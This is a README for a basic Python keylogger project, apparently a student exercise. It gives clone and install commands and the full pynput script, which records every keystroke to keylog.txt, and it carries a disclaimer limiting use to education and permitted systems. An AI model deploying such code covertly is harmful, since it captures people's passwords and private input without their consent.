# Simple Keylogger

This project demonstrates a basic keylogger program that records and logs keystrokes. The keylogger captures the keys pressed by the user and saves them to a file named `keylog.txt`.

**Important Note**: This keylogger is intended for educational purposes only. Always ensure you have explicit permission to log keystrokes on any system you use this code on. Unauthorized use of keyloggers can be illegal and unethical.

## Features

- Logs all keystrokes pressed by the user.
- Saves the logged keystrokes to a file named `keylog.txt`.

## Prerequisites

- Python 3.x
- `pynput` library

## Installation

1. Clone this repository to your local machine:

    ```sh
    git clone https://github.com/oraclebrain/PRODIGY_CS_04.git
    ```

2. Navigate to the project directory:

    ```sh
    cd PRODIGY_CS_04
    ```

3. Install the required dependencies:

    ```sh
    pip install pynput
    ```

## Usage

1. Run the keylogger script:

    ```sh
    python keylogger.py
    ```

2. The script will start logging keystrokes and save them to `keylog.txt`.

## Code Overview

```python
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keylog.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
